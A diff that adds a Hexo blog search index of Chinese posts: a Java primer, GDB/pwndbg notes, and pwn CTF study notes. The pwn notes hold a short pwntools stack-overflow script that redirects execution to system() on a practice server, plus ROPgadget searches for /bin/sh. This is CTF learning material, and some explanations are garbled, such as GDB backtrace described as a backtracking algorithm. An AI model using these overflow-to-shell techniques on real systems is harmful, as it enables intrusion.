@@ -1,0 +1,838 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>博客运营指南</title>
+    <url>/Astral.github.io/2024/01/13/Hexo%E8%BF%90%E8%90%A5%E6%8C%87%E5%8D%97/</url>
+    <content><![CDATA[<p>就是不会多百度，多去思考和尝试，大不了重建！</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JAVA的自我修炼</title>
+    <url>/Astral.github.io/2024/01/13/JAVA%E4%B8%80%E5%AD%A6%E5%88%B0%E5%BA%95/</url>
+    <content><![CDATA[<h2 id="我的第一个-JAVA-程序"><a href="#我的第一个-JAVA-程序" class="headerlink" title="我的第一个 JAVA 程序"></a>我的第一个 JAVA 程序</h2><p>创建文件 <strong>HelloWorld.java(文件名需与类名一致)</strong>, 代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ javac HelloWorld.java</span><br><span class="line">$ java HelloWorld</span><br><span class="line">Hello World</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="执行命令解析："><a href="#执行命令解析：" class="headerlink" title="执行命令解析："></a>执行命令解析：</h4><p>以上我们使用了两个命令 <strong>javac</strong> 和 <strong>java</strong>。</p>
+<p><strong>javac</strong> 后面跟着的是java文件的文件名，例如 HelloWorld.java。 该命令用于将 java 源文件编译为 class 字节码文件，如： <strong>javac HelloWorld.java</strong>。</p>
+<p>运行javac命令后，如果成功编译没有错误的话，会出现一个 HelloWorld.class 的文件。</p>
+<p><strong>java</strong> 后面跟着的是java文件中的类名,例如 HelloWorld 就是类名，如: java HelloWorld。</p>
+<p><strong>注意</strong>：java命令后面不要加.class。</p>
+<h2 id="主要特性"><a href="#主要特性" class="headerlink" title="主要特性"></a>主要特性</h2><ul>
+<li><p><strong>Java 语言是简单的：</strong></p>
+<p>Java 语言的语法与 C 语言和 C++ 语言很接近，使得大多数程序员很容易学习和使用。另一方面，Java 丢弃了 C++ 中很少使用的、很难理解的、令人迷惑的那些特性，如操作符重载、多继承、自动的强制类型转换。特别地，Java 语言不使用指针，而是引用。并提供了自动分配和回收内存空间，使得程序员不必为内存管理而担忧。</p>
+</li>
+<li><p><strong>Java 语言是面向对象的：</strong></p>
+<p>Java 语言提供类、接口和继承等面向对象的特性，为了简单起见，只支持类之间的单继承，但支持接口之间的多继承，并支持类与接口之间的实现机制（关键字为 implements）。Java 语言全面支持动态绑定，而 C++语言只对虚函数使用动态绑定。总之，Java语言是一个纯的面向对象程序设计语言。</p>
+</li>
+<li><p><strong>Java语言是分布式的：</strong></p>
+<p>Java 语言支持 Internet 应用的开发，在基本的 Java 应用编程接口中有一个网络应用编程接口（java net），它提供了用于网络应用编程的类库，包括 URL、URLConnection、Socket、ServerSocket 等。Java 的 RMI（远程方法激活）机制也是开发分布式应用的重要手段。</p>
+</li>
+<li><p>Java 语言是健壮的：</p>
+<p>Java 的强类型机制、异常处理、垃圾的自动收集等是 Java 程序健壮性的重要保证。对指针的丢弃是 Java 的明智选择。Java 的安全检查机制使得 Java 更具健壮性。</p>
+</li>
+<li><p><strong>Java语言是安全的：</strong></p>
+<p>Java通常被用在网络环境中，为此，Java 提供了一个安全机制以防恶意代码的攻击。除了Java 语言具有的许多安全特性以外，Java 对通过网络下载的类具有一个安全防范机制（类 ClassLoader），如分配不同的名字空间以防替代本地的同名类、字节代码检查，并提供安全管理机制（类 SecurityManager）让 Java 应用设置安全哨兵。</p>
+</li>
+<li><p><strong>Java 语言是体系结构中立的：</strong></p>
+<p>Java 程序（后缀为 java 的文件）在 Java 平台上被编译为体系结构中立的字节码格式（后缀为 class 的文件），然后可以在实现这个 Java 平台的任何系统中运行。这种途径适合于异构的网络环境和软件的分发。</p>
+</li>
+<li><p><strong>Java 语言是可移植的：</strong></p>
+<p>这种可移植性来源于体系结构中立性，另外，Java 还严格规定了各个基本数据类型的长度。Java 系统本身也具有很强的可移植性，Java 编译器是用 Java 实现的，Java 的运行环境是用 ANSI C 实现的。</p>
+</li>
+<li><p><strong>Java 语言是解释型的：</strong></p>
+<p>如前所述，Java 程序在 Java 平台上被编译为字节码格式，然后可以在实现这个 Java 平台的任何系统中运行。在运行时，Java 平台中的 Java 解释器对这些字节码进行解释执行，执行过程中需要的类在联接阶段被载入到运行环境中。</p>
+</li>
+<li><p><strong>Java 是高性能的：</strong></p>
+<p>与那些解释型的高级脚本语言相比，Java 的确是高性能的。事实上，Java 的运行速度随着 JIT(Just-In-Time）编译器技术的发展越来越接近于 C++。</p>
+</li>
+<li><p><strong>Java 语言是多线程的：</strong></p>
+<p>在 Java 语言中，线程是一种特殊的对象，它必须由 Thread 类或其子（孙）类来创建。通常有两种方法来创建线程：其一，使用型构为 Thread(Runnable) 的构造子类将一个实现了 Runnable 接口的对象包装成一个线程，其二，从 Thread 类派生出子类并重写 run 方法，使用该子类创建的对象即为线程。值得注意的是 Thread 类已经实现了 Runnable 接口，因此，任何一个线程均有它的 run 方法，而 run 方法中包含了线程所要运行的代码。线程的活动由一组方法来控制。Java 语言支持多个线程的同时执行，并提供多线程之间的同步机制（关键字为 synchronized）。</p>
+</li>
+<li><p><strong>Java 语言是动态的：</strong></p>
+<p>Java 语言的设计目标之一是适应于动态变化的环境。Java 程序需要的类能够动态地被载入到运行环境，也可以通过网络来载入所需要的类。这也有利于软件的升级。另外，Java 中的类有一个运行时刻的表示，能进行运行时刻的类型检查。</p>
+</li>
+</ul>
+<h2 id="Java-关键字"><a href="#Java-关键字" class="headerlink" title="Java 关键字"></a>Java 关键字</h2><p>下面列出了 Java 关键字。这些保留字不能用于常量、变量、和任何标识符的名称。</p>
+<table>
+<thead>
+<tr>
+<th align="left">类别</th>
+<th align="left">关键字</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">访问控制</td>
+<td align="left">private</td>
+<td align="left">私有的</td>
+</tr>
+<tr>
+<td align="left">protected</td>
+<td align="left">受保护的</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">public</td>
+<td align="left">公共的</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">default</td>
+<td align="left">默认</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">类、方法和变量修饰符</td>
+<td align="left">abstract</td>
+<td align="left">声明抽象</td>
+</tr>
+<tr>
+<td align="left">class</td>
+<td align="left">类</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">extends</td>
+<td align="left">扩充、继承</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">final</td>
+<td align="left">最终值、不可改变的</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">implements</td>
+<td align="left">实现（接口）</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">interface</td>
+<td align="left">接口</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">native</td>
+<td align="left">本地、原生方法（非 Java 实现）</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">new</td>
+<td align="left">创建</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">static</td>
+<td align="left">静态</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">strictfp</td>
+<td align="left">严格浮点、精准浮点</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">synchronized</td>
+<td align="left">线程、同步</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">transient</td>
+<td align="left">短暂</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">volatile</td>
+<td align="left">易失</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">程序控制语句</td>
+<td align="left">break</td>
+<td align="left">跳出循环</td>
+</tr>
+<tr>
+<td align="left">case</td>
+<td align="left">定义一个值以供 switch 选择</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">continue</td>
+<td align="left">继续</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">do</td>
+<td align="left">运行</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">else</td>
+<td align="left">否则</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">for</td>
+<td align="left">循环</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">if</td>
+<td align="left">如果</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">instanceof</td>
+<td align="left">实例</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">return</td>
+<td align="left">返回</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">switch</td>
+<td align="left">根据值选择执行</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">while</td>
+<td align="left">循环</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">错误处理</td>
+<td align="left">assert</td>
+<td align="left">断言表达式是否为真</td>
+</tr>
+<tr>
+<td align="left">catch</td>
+<td align="left">捕捉异常</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">finally</td>
+<td align="left">有没有异常都执行</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">throw</td>
+<td align="left">抛出一个异常对象</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">throws</td>
+<td align="left">声明一个异常可能被抛出</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">try</td>
+<td align="left">捕获异常</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">包相关</td>
+<td align="left">import</td>
+<td align="left">引入</td>
+</tr>
+<tr>
+<td align="left">package</td>
+<td align="left">包</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">基本类型</td>
+<td align="left">boolean</td>
+<td align="left">布尔型</td>
+</tr>
+<tr>
+<td align="left">byte</td>
+<td align="left">字节型</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">char</td>
+<td align="left">字符型</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">double</td>
+<td align="left">双精度浮点</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">float</td>
+<td align="left">单精度浮点</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">int</td>
+<td align="left">整型</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">long</td>
+<td align="left">长整型</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">short</td>
+<td align="left">短整型</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">变量引用</td>
+<td align="left">super</td>
+<td align="left">父类、超类</td>
+</tr>
+<tr>
+<td align="left">this</td>
+<td align="left">本类</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">void</td>
+<td align="left">无返回值</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">保留关键字</td>
+<td align="left">goto</td>
+<td align="left">是关键字，但不能使用</td>
+</tr>
+<tr>
+<td align="left">const</td>
+<td align="left">是关键字，但不能使用</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<p><strong>注意：</strong>Java 的 null 不是关键字，类似于 true 和 false，它是一个字面常量，不允许作为标识符使用。</p>
+<hr>
+<h2 id="Java注释"><a href="#Java注释" class="headerlink" title="Java注释"></a>Java注释</h2><p>类似于 C&#x2F;C++、Java 也支持单行以及多行注释。</p>
+<p>注释中的字符将被 Java 编译器忽略。</p>
+<p>public class HelloWorld {   &#x2F;* 这是第一个Java程序    * 它将输出 Hello World    * 这是一个多行注释的示例    <em>&#x2F;    public static void main(String[] args){       &#x2F;&#x2F; 这是单行注释的示例       &#x2F;</em> 这个也是单行注释的示例 *&#x2F;       System.out.println(“Hello World”);     } }</p>
+]]></content>
+      <categories>
+        <category>程序语言</category>
+      </categories>
+      <tags>
+        <tag>JAVA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwngdb和pwndbg联合使用</title>
+    <url>/Astral.github.io/2024/01/06/pwngdb%E5%92%8Cpwndbg%E8%81%94%E5%90%88%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>编译程序——启动GDB——运行程序——调试程序</p>
+<p>编译程序</p>
+<p>使用gcc编译C语言程序，并添加-g选项，以生成调试信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -g -o program program.c</span><br></pre></td></tr></table></figure>
+
+<p>启动GDB</p>
+<p>在终端中输入以下命令来启动GDB，并将可执行文件作为参数传递给它：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb program</span><br></pre></td></tr></table></figure>
+
+<p>运行程序</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>调试程序</p>
+<p>程序开始执行后，你可以使用以下命令进行调试：</p>
+<ul>
+<li>next：执行下一行代码。</li>
+<li>step：进入函数并调试该函数。</li>
+<li>finish：从当前函数返回到调用它的函数，并在那里暂停。</li>
+<li>break：在某个位置上设置断点。</li>
+<li>watch：在某个变量上设置监视点。</li>
+<li>print：打印变量的值。</li>
+</ul>
+<p>退出GDB</p>
+<p>使用quit命令退出GDB：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="栈的开启和销毁、函数的调用理解"><a href="#栈的开启和销毁、函数的调用理解" class="headerlink" title="栈的开启和销毁、函数的调用理解"></a>栈的开启和销毁、函数的调用理解</h2><p>当一个函数被调用时，程序会将当前函数的返回地址、参数和局部变量等信息推入栈中，然后跳转到被调用的函数。被调用的函数使用这些信息执行操作，完了之后再从栈中弹出这些信息，返回到原始的函数。</p>
+<p>以下是一些关于函数调用和栈的开启和销毁的基本概念和操作：</p>
+<ol>
+<li>函数调用</li>
+</ol>
+<p>在C语言中，你可以使用函数名来调用函数。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">复制代码int result = add(2, 3);</span><br></pre></td></tr></table></figure>
+
+<p>这里我们调用了一个名为add的函数，并传递了两个参数2和3。被调用的函数返回一个值，该值存储在result变量中。</p>
+<p>栈的开启和销毁</p>
+<p>在函数调用过程中，程序需要在堆栈上保留一些信息，包括返回地址、参数和局部变量等。这些信息通常在函数开头时被放入堆栈中，并在函数结束时从堆栈中弹出。这个过程称为栈的开启和销毁。</p>
+<p>在C语言中，你不需要手动开启或销毁堆栈，编译器会自动完成这些工作。它会生成代码，在函数开头向堆栈中推送所需的信息，并在函数结束时从堆栈中弹出这些信息。这个过程是透明的，你只需要调用函数即可。</p>
+<p>递归函数</p>
+<p>递归函数是一种特殊的函数，它在其自身内部调用自己。在递归调用期间，每个函数调用都会将新的信息推入堆栈中，因此堆栈的大小会不断增加。当递归调用结束时，每个函数调用都会从堆栈中弹出信息，因此堆栈的大小会逐渐减小。</p>
+<p>当递归调用过多时，堆栈可能会耗尽，导致堆栈溢出错误。为了避免这种情况，你可以使用尾递归优化或者循环来代替递归。</p>
+<p>总之，函数调用和栈的开启和销毁是C语言中非常基本的概念和操作。在编写C程序时，你需要注意函数调用、堆栈的使用和内存的管理，以避免出现错误和漏洞。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn学习笔记</title>
+    <url>/Astral.github.io/2024/01/06/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="基础：-C语言-汇编语言-python，操作系统-Linux系统管理"><a href="#基础：-C语言-汇编语言-python，操作系统-Linux系统管理" class="headerlink" title="基础： C语言  汇编语言   python，操作系统  Linux系统管理"></a>基础： C语言  汇编语言   python，操作系统  Linux系统管理</h2><h2 id="工具：IDApro-GDB-pwntools-pwndbg"><a href="#工具：IDApro-GDB-pwntools-pwndbg" class="headerlink" title="工具：IDApro     GDB    pwntools     pwndbg"></a>工具：IDApro     GDB    pwntools     pwndbg</h2><h1 id="pwn环境的搭建："><a href="#pwn环境的搭建：" class="headerlink" title="pwn环境的搭建："></a>pwn环境的搭建：</h1><h2 id="1-python2-python3代码："><a href="#1-python2-python3代码：" class="headerlink" title="1.python2,python3代码："></a>1.python2,python3代码：</h2><p>sudo apt install python2</p>
+<p>sudo apt install python3-pip</p>
+<h2 id="2-ubuntu怎么切换到root用户，使用su-root命令，去切换到root权限，会提示输入密码，可是如何也输不对，提示“Authentication-failure”或者是提示认证失败。"><a href="#2-ubuntu怎么切换到root用户，使用su-root命令，去切换到root权限，会提示输入密码，可是如何也输不对，提示“Authentication-failure”或者是提示认证失败。" class="headerlink" title="2.ubuntu怎么切换到root用户，使用su root命令，去切换到root权限，会提示输入密码，可是如何也输不对，提示“Authentication failure”或者是提示认证失败。"></a>2.ubuntu怎么切换到root用户，使用su root命令，去切换到root权限，会提示输入密码，可是如何也输不对，提示“Authentication failure”或者是提示认证失败。</h2><p>该错误有两种情况一个是密码错了，另一种就是新安装好的Linux系统，暂时还没有给root设置密码。</p>
+<p>1、打开Ubuntu，输入命令：su root，回车提示输入密码，如何输入都不对。</p>
+<p>2、给root用户设置密码，命令“sudo passwd root ” 。 输入密码，并确认密码。</p>
+<p>3、重新输入命令“su root”   然后输入密码。就可切换到root权限了。</p>
+<h2 id="3-安装vim"><a href="#3-安装vim" class="headerlink" title="3. 安装vim"></a>3. 安装vim</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install vim</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-修改软件源"><a href="#4-修改软件源" class="headerlink" title="4. 修改软件源"></a>4. 修改软件源</h2><p>ubuntu自带的软件源是国外的，速度慢有的时候还连不上，于是应修改为国内的镜像。</p>
+<p><a href="https://blog.csdn.net/qq_43871241/article/details/128935374?ops_request_misc=%7B%22request_id%22:%22170031586316800182128499%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170031586316800182128499&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_click~default-2-128935374-null-null.nonecase&utm_term=ubuntu22.04%E6%8D%A2%E6%BA%90&spm=1018.2226.3001.4450">Ubuntu22.04更换软件源-CSDN博客</a></p>
+<p>修改完文件之后记得<code>apt update</code>和<code>apt upgrade</code>进行更新。</p>
+<p><a href="https://blog.csdn.net/m0_52249553/article/details/130477579?ops_request_misc=%7B%22request_id%22:%22170031475716800215023037%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170031475716800215023037&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-1-130477579-null-null.nonecase&utm_term=ubuntu22.04%E9%85%8D%E7%BD%AEpwn%E7%8E%AF%E5%A2%83&spm=1018.2226.3001.4450">Ubuntu下pwn环境搭建_pwn ubuntu-CSDN博客</a></p>
+<h2 id="主流漏洞："><a href="#主流漏洞：" class="headerlink" title="主流漏洞："></a>主流漏洞：</h2><p>栈溢出   堆溢出    ROP     格式化字符串漏洞      其他漏洞</p>
+<h2 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h2><p>获取题目附件</p>
+<p>将附件复制一份到Linux虚拟机中，使用checksec指令检查程序开启的保护和程序的位数（32位或64位）</p>
+<p>打开题目环境，使用nc指令连接服务器，尝试猜测程序的功能，有时签到题会在你nc上去后，直接提供给你系统权限，此时可直接使用系统指令，寻找flag</p>
+<p>使用对应位数的IDA工具对附件进行反编译，理解并发现其中的漏洞</p>
+<p>分析漏洞，使用python和pwntool库编写攻击脚本playload。</p>
+<p>最后，让你的攻击脚本跑起来，成功拿取权限后，flag即可到手</p>
+<p><strong>首先看到无后缀文件，可以判断应该是Linux EIF文件，用Linux file命令看，发现是64位的文件</strong></p>
+<p><strong>main()函数按F5查看伪代码，发现危险函数gets，可以判断存在栈溢出漏洞</strong></p>
+<p>接着查看fun()函数，发现是system函数，system是c语言下的一个可以执行shell命令的函数</p>
+<p><strong>函数的局部变量会存放在他的栈中，那么在main函数中，我们双击s变量，查看s分配了多少空间</strong></p>
+<p>攻击脚本</p>
+<p>from pwn import *<br>p&#x3D;remote(“node4.buuoj.cn”,29244) &#x2F;&#x2F;靶机地址和端口<br>payload&#x3D;’A’*15+’B’*8+p64(0x401186+1).decode(“iso-8859-1”)<br>&#x2F;&#x2F;char s的15个字节+RBP的8字节+fun函数入口地址，+1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。<br>p.sendline(payload)<br>p.interactive()</p>
+<h2 id="常用指令："><a href="#常用指令：" class="headerlink" title="常用指令："></a>常用指令：</h2><p>学习技巧：</p>
+<p>1.复制主机中的内容，然后在虚拟机终端直接按鼠标滚轮 &#x2F;  右键选择粘贴即可</p>
+<p>在vim 编辑器中快速删除内容， gg +d </p>
+<p> Ctrl +Z   退出</p>
+<p>nc的全名是<a href="https://so.csdn.net/so/search?q=netcat&spm=1001.2101.3001.7020">netcat</a>，其主要用途是建立和监听任意TCP和UDP连接，支持ipv4和ipv6。因此，它可以用来网络调试、端口扫描等等（nc [-hlnruz][-g&lt;网关…&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v…][-w&lt;超时秒数&gt;][主机名称][通信端口…]）</p>
+<p>fun函数里面发现了system函数，system是c语言下的一个可以执行shell命令的函数，目前你可以简单理解为，执行了这个危险函数，我们就拿到了远端服务器的shell，也就是相当于在windows下以管理员身份开启cmd，那么我们就可以通过一系列后续指令控制远端服务器。</p>
+<p>+1是为了堆栈平衡</p>
+<p>from pwn import *</p>
+<p>p &#x3D; remote(‘node4.buuoj.cn’, 27451)</p>
+<p>使用python3 xx.py 运行攻击脚本</p>
+<p><strong>checksec 查看保护程序</strong></p>
+<p><strong>file查看文件</strong></p>
+<h2 id="linux系统管理"><a href="#linux系统管理" class="headerlink" title="linux系统管理"></a>linux系统管理</h2><p>file 文件  &#x2F;&#x2F;查看文件类型<br>checksec 文件  &#x2F;&#x2F;查看文件保护<br>echo ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo&#x3D; | base64 -d       &#x2F;&#x2F;Linux自带Base64解码工具<br>chmod 777 文件名   &#x2F;&#x2F;给文件加可执行权限</p>
+<h2 id="IDApro"><a href="#IDApro" class="headerlink" title="IDApro"></a>IDApro</h2><p>快捷键<br>Tab     切换<br>空格    看IDA地址<br>N       改函数名字<br>&#x2F;       进行备注<br>F5      看伪代码<br>shift+F12     看字符串<br>Esc           返回上一步<br>ctrl+x        查看一下哪里调用了这个字符串<br>g             输入地址，可以跳转到地址位置</p>
+<h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>gdb        &#x2F;&#x2F;执行文件<br>b main     &#x2F;&#x2F;动态调试main函数，或者某个地址<br>r          &#x2F;&#x2F;跑起来<br>ni        &#x2F;&#x2F;一步一步调试这个函数<br>n         &#x2F;&#x2F;执行<br>si        &#x2F;&#x2F;进入这个函数<br>cyclic -l ad   &#x2F;&#x2F;计算值ad之前的字符串长度<br>cyclic 200    &#x2F;&#x2F;生成200个垃圾字符<br>plt           &#x2F;&#x2F;查看调用哪些的函数<br>got           &#x2F;&#x2F;查看调用函数的具体地址<br>return         &#x2F;&#x2F;从子函数返回<br>x&#x2F;20gx 0x45622       &#x2F;&#x2F;查看地址的机械码<br>disass 0x7fff7e65       &#x2F;&#x2F;反汇编<br>backtrace            &#x2F;&#x2F;显示整个函数调用的栈情况</p>
+<p>gdb + 程序   → b main  → R  运行  </p>
+<p>GDB调试结果各部分</p>
+<p>————————————————————[REGISTERS]————————————————————————</p>
+<p>寄存器（Registers）是位于CPU内部的一组高速存储器单元。寄存器用于存储和处理指令执行过程中的数据、地址和控制信息。</p>
+<p>───────────────────────────——─[DISASM]─——————────────────────────────────</p>
+<p>DISASM是指反汇编（Disassembly）的过程，它将机器码（二进制代码）转换回可读的汇编语言表示形式。反汇编器（Disassembler）是执行这一过程的工具或程序。</p>
+<p>——————————————————————SOURCE (CODE)——————————————————————-</p>
+<p>源代码（Source code）是计算机程序的人类可读形式，通常使用文字编写的一系列指令和声明。它是软件开发过程中的重要组成部分，用于描述程序的逻辑、功能和行为。</p>
+<p>——————————————————————STACK———————————————————————————— </p>
+<p>栈（Stack）是一种数据结构，它具有<strong>后进先出</strong>（Last In First Out，简称LIFO）的特性，也就是最后进入的元素首先被取出。</p>
+<p>在计算机科学中，栈通常用于存储临时数据和函数调用信息。当一个函数被调用时，它的参数和返回地址等信息会被压入栈中，当函数执行完毕后，这些信息会被弹出栈。</p>
+<p>栈有两个基本操作：压入（Push）和弹出（Pop）。当新元素被压入栈时，它被放置在栈顶；当元素被弹出栈时，它被移除并返回到调用者。栈还支持访问栈顶元素的操作，但不允许在非栈顶位置插入或删除元素。</p>
+<p>————————————————————BACKTRACE———————————————————————————</p>
+<p>回溯（Backtrace）是一种递归的算法，通过尝试不同的选择来解决问题。回溯算法通常用于在搜索空间中找到所有或特定数量的解。</p>
+<p>回溯算法的基本思想是：从问题的初始状态开始，通过尝试每个可能的选择，逐步地向解决方案前进。如果某个选择不能够得到解决方案，就会返回到上一个状态并尝试其他选择。这个过程会一直重复，直到找到解决方案或者无法再尝试任何选择为止。</p>
+<p>回溯算法通常用递归函数来实现。在递归调用中，程序会先尝试一个选择，然后递归调用自身来处理子问题。如果子问题能够得到解决方案，就会返回真值；否则，程序会撤销当前选择，并尝试其他选择。当所有选择都尝试完毕后，如果依然没有找到解决方案，就返回假值。</p>
+<p>在 GDB 中进行调试通常遵循以下一般流程：</p>
+<ol>
+<li><p><strong>编译程序时启用调试信息</strong>：在使用 GCC 或其他编译器编译程序时，需要添加 <code>-g</code> 选项以包含调试信息。例如：</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">复制代码gcc -g -o program program.c</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>启动 GDB</strong>：在命令行中输入 <code>gdb program</code> 来启动 GDB 并加载要调试的程序。</p>
+</li>
+<li><p><strong>设置断点</strong>：通过在感兴趣的位置设置断点，可以指示 GDB 在执行到该位置时停下来。可以使用 <code>break</code> 命令设置断点，例如：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">复制代码<span class="keyword">break</span> main</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>运行程序</strong>：输入 <code>run</code> 命令来运行程序，直到遇到设置的断点或程序结束。</p>
+</li>
+<li><p><strong>逐步执行程序</strong>：一旦程序停在断点处，可以使用 <code>step</code> 命令逐步执行程序，逐行查看程序的执行过程，并检查变量的值和程序状态。</p>
+</li>
+<li><p><strong>观察变量和内存</strong>：使用 <code>print</code> 命令来查看变量的值，使用 <code>display</code> 命令设置要自动显示的表达式，使用 <code>x</code> 命令查看内存中的内容。</p>
+</li>
+<li><p><strong>继续执行</strong>：使用 <code>continue</code> 命令让程序继续执行，直到再次遇到断点或程序结束。</p>
+</li>
+<li><p><strong>跟踪函数调用</strong>：使用 <code>step</code> 命令进入函数内部进行单步执行，或使用 <code>next</code> 命令跳过函数内部的单步执行。</p>
+</li>
+<li><p><strong>处理异常情况</strong>：如果程序出现异常，如段错误或断言失败，GDB 会停止程序并显示相关的调试信息，帮助你定位问题所在。</p>
+</li>
+<li><p><strong>退出 GDB</strong>：当调试结束时，可以输入 <code>quit</code> 命令退出 GDB。</p>
+</li>
+</ol>
+<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>python3<br>from pwn import *<br>io &#x3D; remote(“122.54.129.202”,端口)#建立连接<br>io.rercv() #接收信息<br>&#x2F;&#x2F;本地：<br>python3<br>from pwn import *<br>io &#x3D; process(“.&#x2F;level0”)<br>gdb.attach(io,’b *0x080485c5’)   &#x2F;&#x2F;设置断点去调式攻击代码<br>io.recvline()<br>payload &#x3D; b’a’*16 + p64(0x6532387)<br>io.sendline(payload)  &#x2F;&#x2F;传送信息过去<br>io.interactive()  &#x2F;&#x2F;交互</p>
+<h2 id="elf"><a href="#elf" class="headerlink" title="elf"></a>elf</h2><p>elf &#x3D; ELF(“.&#x2F;ret2syscall”)<br>system_plt &#x3D; elf.plt[“system”]       &#x2F;&#x2F;查找system的地址<br>binsh &#x3D; hex(next(elf.search(b”&#x2F;bin&#x2F;sh”)))   #pwntools自动找&#x2F;bin&#x2F;sh地址</p>
+<h2 id="ROPgadget用法"><a href="#ROPgadget用法" class="headerlink" title="ROPgadget用法"></a>ROPgadget用法</h2><p>ROPgadget –binary 文件名 –only “pop|ret”  &#x2F;&#x2F;文件中的查找gadgets<br>ROPgadget –binary .&#x2F;7.exe –only “pop|ret” | grep “eax”    &#x2F;&#x2F;从pop、ret序列当中寻找其中的eax</p>
+<p>ROPgadget –binary .&#x2F;7.exe –only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”      &#x2F;&#x2F; 从pop、ret序列当中寻找其中的ebx、ecx、dex</p>
+<p>ROPgadget –binary .&#x2F;7.exe –string “&#x2F;bin&#x2F;sh”           &#x2F;&#x2F;找”&#x2F;bin&#x2F;sh”这个字符串的地址</p>
